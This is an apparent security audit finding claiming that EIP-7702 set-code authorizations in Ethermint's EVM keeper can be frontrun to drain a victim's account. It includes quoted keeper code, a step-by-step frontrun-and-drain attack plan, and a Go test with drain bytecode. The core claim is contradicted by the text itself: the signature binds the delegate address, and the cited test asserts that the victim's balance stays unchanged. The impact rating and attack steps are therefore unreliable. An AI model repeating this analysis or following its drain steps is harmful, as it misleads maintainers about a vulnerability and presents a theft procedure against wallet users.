### Title
EIP-7702 `SetCodeAuthorization` Signature Can Be Frontrun by Any Unprivileged Outer Signer to Forcibly Delegate Victim's EOA Code - (`File: x/evm/keeper/set_code_authorizations.go`)

---

### Summary

The EIP-7702 authorization mechanism in Ethermint does not bind a `SetCodeAuthorization` signature to the outer transaction signer. Any unprivileged actor who observes a victim's signed authorization tuple `(chainID, address, nonce, v, r, s)` in the mempool can extract it and embed it in their own `SetCodeTx`, causing the victim's EOA to be delegated to an attacker-chosen contract before the victim's own transaction executes. This is the direct Ethermint analog of the `pullTokensWithPermit` frontrunning vulnerability: a signed authorization is a transferable credential that is not bound to the submitting transaction.

---

### Finding Description

In EIP-7702, a `SetCodeAuthorization` is a signed tuple `(chainID, address, nonce)` that authorizes the `authority` (the signer) to have their EOA code set to a delegation pointer. The outer transaction that carries this authorization can be signed by **any** account — the authority and the outer signer are completely independent.

In Ethermint's `validateAuthorization`:

```go
// x/evm/keeper/set_code_authorizations.go:15-43
func (k *Keeper) validateAuthorization(auth *types.SetCodeAuthorization, stateDB vm.StateDB) (authority common.Address, err error) {
    if !auth.ChainID.IsZero() && auth.ChainID.CmpBig(k.eip155ChainID) != 0 {
        return authority, core.ErrAuthorizationWrongChainID
    }
    ...
    authority, err = auth.Authority()   // recovers signer from (v,r,s)
    ...
    if have := stateDB.GetNonce(authority); have != auth.Nonce {
        return authority, core.ErrAuthorizationNonceMismatch
    }
    return authority, nil
}
```

The validation checks only: (1) chain ID, (2) nonce overflow, (3) signature validity, (4) authority's current nonce matches `auth.Nonce`. There is **no check** that the outer transaction signer equals the authority, and no check that the `auth.Address` (the delegate) is one the authority intended to use in this specific outer transaction context.

This is by design in EIP-7702 itself — the spec allows third-party sponsors. However, the critical missing protection is that the authorization tuple is not bound to any specific outer transaction hash, `to` address, or outer signer. A signed authorization is therefore a **reusable, transferable credential** until the authority's nonce advances past `auth.Nonce`.

The `ApplyTransaction` path in `state_transition.go` confirms the outer signer is irrelevant to authorization processing:

```go
// x/evm/keeper/state_transition.go:484-499
for _, auth := range msg.SetCodeAuthorizations {
    authority, err := k.applyAuthorization(&auth, stateDB)
    if err != nil {
        k.Logger(ctx).Debug("failed to apply authorization", ...)
        continue
    }
    validAuths = append(validAuths, validAuth{auth: auth, authority: authority})
}
```

The test `TestSetCodeAuthorizationReplayByDifferentOuterSignerSkippedAfterFailedExecution` explicitly confirms that a different outer signer (`replayKey`) can successfully submit the same `auth` tuple in a second transaction after the first outer signer's transaction failed — and the authorization is still applied to the authority's account.

Furthermore, the durable authorization mechanism in `ApplyTransaction` ensures the authorization **survives even if the EVM call itself fails** (e.g., post-hook failure):

```go
// x/evm/keeper/state_transition.go:266-268
if commitDurableAuthorization != nil && !tmpCtxCommitted {
    commitDurableAuthorization()
}
```

This means an attacker can:
1. Observe a victim's signed authorization in the mempool.
2. Construct a `SetCodeTx` with the victim's auth tuple but with the `to` field pointing to an attacker-controlled contract that drains the victim's balance.
3. Submit with higher gas priority (frontrun).
4. The victim's EOA is delegated to the attacker's drain contract.
5. The attacker's outer call executes the drain logic in the context of the victim's EOA.
6. Even if the EVM call reverts (e.g., due to a post-hook), the authorization (nonce bump + delegation code) is durably committed.

The test `TestSetCodeAuthorizationDrainCallRolledBackButAuthorizationConsumedOnPostHookFailure` explicitly models this drain scenario and confirms the authorization is consumed even when the EVM call is rolled back.

---

### Impact Explanation

**High** — EIP-7702 authorization bypass enabling unauthorized account/code mutation and potential theft of EVM-denom funds.

A victim who signs a `SetCodeAuthorization` to delegate to a trusted contract (e.g., a multisig wallet or session key contract) can have that authorization frontrun by an attacker who substitutes a malicious `to` address in the outer transaction. The victim's EOA is then delegated to the attacker's contract, which can execute arbitrary code in the victim's context (including draining their balance via `SELFBALANCE` + `CALL`). The victim's original transaction then fails because the nonce has already been consumed by the durable authorization commit.

---

### Likelihood Explanation

**Medium-High.** The Ethermint mempool is public. Any `SetCodeTx` submitted via `eth_sendRawTransaction` exposes the authorization tuple `(v, r, s, chainID, address, nonce)` in plaintext before inclusion. An attacker monitoring the mempool for type-4 transactions can extract the auth tuple and resubmit it in a new outer transaction with a higher `maxFeePerGas`. This is a standard frontrunning attack requiring no special privileges — only the ability to submit transactions and observe the mempool.

---

### Recommendation

1. **Bind the authorization to the outer transaction**: Include the outer transaction hash or the outer signer's address in the EIP-7702 authorization signing payload. This is a protocol-level change that would require a fork, but it is the root fix.

2. **Ethermint-specific mitigation**: In `validateAuthorization`, optionally enforce that the authority equals the outer transaction signer (`msg.From`) when the authorization's `to` field points to a non-zero address. This would restrict third-party sponsorship but eliminate the frontrunning surface.

3. **Warn users**: Document that `SetCodeAuthorization` tuples must not be shared or broadcast before the outer transaction is included, as they are transferable credentials.

---

### Proof of Concept

The existing test `TestSetCodeAuthorizationDrainCallRolledBackButAuthorizationConsumedOnPostHookFailure` in `x/evm/keeper/state_transition_test.go` already demonstrates the core mechanism:

```go
// x/evm/keeper/state_transition_test.go:1131-1161
auth := suite.signSetCodeAuthorization(authorityKey, delegate, 0)
// outerKey != authorityKey — attacker is the outer signer
msg := suite.buildSetCodeTxWithAuth(authority, outerKey, auth, 200000)
res, err := suite.App.EvmKeeper.EthereumTx(suite.Ctx, msg)
// Authorization is consumed (nonce bumped, delegation set) even though
// the EVM call was rolled back by the post-hook failure.
suite.requireSetCodeAuthorizationConsumed(authority, delegate, 1)
suite.Require().Equal(victimBalance.ToBig(), suite.App.EvmKeeper.GetEVMDenomBalance(suite.Ctx, authority))
```

**Frontrun attack steps:**

1. Victim signs `auth = SignSetCode(victimKey, {chainID, trustedContract, nonce=N})` and broadcasts a `SetCodeTx` with `to = trustedContract`.
2. Attacker observes the mempool, extracts `auth` tuple.
3. Attacker deploys `drainContract` with bytecode `CALL(CALLER, SELFBALANCE, ...)`.
4. Attacker submits `SetCodeTx{to: drainContract, authList: [auth], from: attacker}` with higher gas.
5. `validateAuthorization` passes: chain ID matches, `auth.Nonce == victim.nonce`, signature valid.
6. `setAuthorizationDelegation` sets victim's code to `0xef0100 || drainContract` and bumps victim's nonce to N+1.
7. `evm.Call(attacker, drainContract, ...)` executes drain logic in victim's context, transferring victim's balance to attacker.

func (k *Keeper) validateAuthorization(auth *types.SetCodeAuthorization, stateDB vm.StateDB) (authority common.Address, err error) {
	// Verify chain ID is null or equal to current chain ID.
	if !auth.ChainID.IsZero() && auth.ChainID.CmpBig(k.eip155ChainID) != 0 {
		return authority, core.ErrAuthorizationWrongChainID
	}
	// Limit nonce to 2^64-1 per EIP-2681.
	if auth.Nonce+1 < auth.Nonce {
		return authority, core.ErrAuthorizationNonceOverflow
	}
	// Validate signature values and recover authority.
	authority, err = auth.Authority()
	if err != nil {
		return authority, fmt.Errorf("%w: %v", core.ErrAuthorizationInvalidSignature, err)
	}
	// Check the authority account
	//  1) doesn't have code or has exisiting delegation
	//  2) matches the auth's nonce
	//
	// Note it is added to the access list even if the authorization is invalid.
	stateDB.AddAddressToAccessList(authority)
	code := stateDB.GetCode(authority)
	if _, ok := types.ParseDelegation(code); len(code) != 0 && !ok {
		return authority, core.ErrAuthorizationDestinationHasCode
	}
	if have := stateDB.GetNonce(authority); have != auth.Nonce {
		return authority, core.ErrAuthorizationNonceMismatch
	}
	return authority, nil
}

func (k *Keeper) setAuthorizationDelegation(auth *types.SetCodeAuthorization, authority common.Address, stateDB vm.StateDB) {
	// Update nonce and account code.
	stateDB.SetNonce(authority, auth.Nonce+1, tracing.NonceChangeAuthorization)
	if auth.Address == (common.Address{}) {
		// Delegation to zero address means clear.
		stateDB.SetCode(authority, nil, tracing.CodeChangeAuthorizationClear)
		return
	}

	// Otherwise install delegation to auth.Address.
	stateDB.SetCode(authority, types.AddressToDelegation(auth.Address), tracing.CodeChangeAuthorization)
}

func (suite *StateTransitionTestSuite) TestSetCodeAuthorizationDrainCallRolledBackButAuthorizationConsumedOnPostHookFailure() {
	suite.SetupTest()
	suite.App.EvmKeeper.SetHooks(keeper.NewMultiEvmHooks(FailureHook{}))

	delegate := common.HexToAddress("0x000000000000000000000000000000000000dE1E")
	victimBalance := uint256.NewInt(1000000000)
	authorityKey, err := crypto.GenerateKey()
	suite.Require().NoError(err)
	outerKey, err := crypto.GenerateKey()
	suite.Require().NoError(err)
	authority := crypto.PubkeyToAddress(authorityKey.PublicKey)
	outer := crypto.PubkeyToAddress(outerKey.PublicKey)

	// CALL(CALLER, SELFBALANCE): a permissive delegate used by the PoC drain case.
	drainRuntime := common.FromHex("0x600060006000600047335af100")
	vmdb := suite.StateDB()
	vmdb.SetCode(delegate, drainRuntime, 0)
	vmdb.AddBalance(authority, victimBalance, 0)
	suite.Require().NoError(vmdb.Commit())

	auth := suite.signSetCodeAuthorization(authorityKey, delegate, 0)
	msg := suite.buildSetCodeTxWithAuth(authority, outerKey, auth, 200000)
	res, err := suite.App.EvmKeeper.EthereumTx(suite.Ctx, msg)
	suite.Require().NoError(err)
	suite.Require().True(res.Failed())
	suite.Require().Equal(types.ErrPostTxProcessing.Error(), res.VmError)

	suite.requireSetCodeAuthorizationConsumed(authority, delegate, 1)
	suite.Require().Equal(victimBalance.ToBig(), suite.App.EvmKeeper.GetEVMDenomBalance(suite.Ctx, authority))
	suite.Require().Zero(suite.App.EvmKeeper.GetEVMDenomBalance(suite.Ctx, outer).Sign())
}
